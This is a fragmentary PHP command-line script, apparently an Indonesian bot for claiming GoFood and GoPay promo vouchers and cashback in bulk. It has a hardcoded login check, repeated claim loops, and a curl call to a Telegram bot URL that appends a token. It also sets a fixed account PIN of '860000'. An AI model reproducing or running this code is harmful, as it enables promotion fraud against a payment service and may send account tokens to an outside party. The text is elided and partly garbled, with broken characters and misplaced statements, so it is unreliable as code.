...
echo "\033[0m";
if($user == "����" || $user == "����" || $user == "����" || $user == "imel" || $user == "86")
{
	echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
	echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
...
else
{
		...
		echo "\e[92m          \e[91mJAVABYTECODE          \e[92m \n";
	        echo "\e[92m      \e[91mJAPRI :@Java186         \e[92m \n";
		echo "\e[91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
goto login;
}
	return rtrim( $input, "\n" );
...
// function change(){
	...
	gocar:
        echo "\n".color("purple","☆] Claim voc GOFOOD 15K 5K 10K");
        echo "\n".color("green","☆] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("red",".");
        sleep(20);
        ...
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("green","☆] Message: ".$message);
        echo "\n".color("purple","☆] Claim voc CASHBACK GOPAY 10K");
        echo "\n".color("green","☆] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("red",".");
        sleep(1);
        ...
        $url    = "https://t.me/Paypalviabot?start=r04267918710" . $TOKEN . "/". $method;
                                        $ch = curl_init();
         ...
         echo color("green","▬▬▬▬▬▬▬▬▬▬ PIN ANDA = 860000 ▬▬▬▬▬▬▬▬▬▬")."\n";
         $data2 = '{"pin":"860000"}';
